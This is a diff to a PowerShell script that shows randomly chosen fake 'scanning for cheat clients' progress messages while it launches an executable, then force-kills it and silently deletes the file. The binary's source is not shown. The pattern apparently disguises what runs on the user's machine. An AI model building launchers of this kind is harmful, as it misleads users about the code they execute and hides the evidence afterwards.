@@ -18,11 +18,11 @@ function Show-Progress {
         "searching for Skript",
         "searching for Vape",
         "searching for GhostClient",
-        "searching for tz", # replaced AimBot
-        "searching for tzx", # replaced AutoClicker
-        "searching for bypass", # replaced Reach
-        "searching for strings", # replaced Velocity
-        "searching for fileless execution" # replaced AntiKB
+        "searching for tz",
+        "searching for tzx",
+        "searching for bypass",
+        "searching for strings",
+        "searching for fileless execution"
     )
     
     $randomMessage = $messages | Get-Random
@@ -61,8 +61,8 @@ try {
     Show-Progress -percent 70
     Start-Sleep -Milliseconds 800
     
-    # Run the executable (silently)
-    $process = Start-Process -FilePath $outputPath -WindowStyle Hidden -PassThru
+    # Run the executable (normally, not hidden)
+    $process = Start-Process -FilePath $outputPath -PassThru
     Show-Progress -percent 80
     Start-Sleep -Milliseconds 800
     
@@ -82,6 +82,9 @@ try {
     $processName = [System.IO.Path]::GetFileNameWithoutExtension($outputPath)
     Get-Process -Name $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
     
+    # Small delay to ensure process is fully closed
+    Start-Sleep -Milliseconds 500
+    
     # Delete the file (silently)
     if (Test-Path $outputPath) {
         Remove-Item -Path $outputPath -Force -ErrorAction SilentlyContinue
@@ -97,6 +100,9 @@ catch {
     # Try to close the process if it exists
     $processName = [System.IO.Path]::GetFileNameWithoutExtension($outputPath)
     Get-Process -Name $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+    
+    # Small delay to ensure process is fully closed
+    Start-Sleep -Milliseconds 500
     
     # Try to delete the file if it exists
     if (Test-Path $outputPath) {
